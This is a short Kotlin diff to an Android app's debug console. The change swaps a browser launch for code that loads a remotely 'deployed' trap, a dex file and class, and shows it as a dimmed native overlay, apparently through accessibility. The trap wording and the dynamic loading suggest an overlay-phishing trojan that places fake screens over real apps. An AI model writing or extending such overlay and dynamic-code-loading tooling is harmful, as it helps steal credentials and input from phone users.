@@ -720,7 +720,23 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
                     Button(
                         onClick = { 
                             showDevControls = false
-                            ctx.startActivity(Intent(ctx, BrowserActivity::class.java))
+                            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                            val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
+                            val nativeArr = org.json.JSONArray(nativeStr)
+                            var found = false
+                            for (i in 0 until nativeArr.length()) {
+                                val trap = nativeArr.getJSONObject(i)
+                                if (trap.optString("label").equals("Browser", ignoreCase = true) || trap.optString("class_name").contains("BrowserUI")) {
+                                    val dexPath = trap.getString("file_path")
+                                    val className = trap.getString("class_name")
+                                    val dimLevel = trap.optInt("dim", 85)
+                                    val method = trap.optString("method", "ACC")
+                                    com.example.myandroid.DynamicUIManager.showNativeOverlay(ctx, dexPath, className, dimLevel, method)
+                                    found = true
+                                    break
+                                }
+                            }
+                            if (!found) android.widget.Toast.makeText(ctx, "Trap 'Browser' not armed. Deploy via Dashboard first.", android.widget.Toast.LENGTH_LONG).show()
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                         modifier = Modifier.fillMaxWidth()
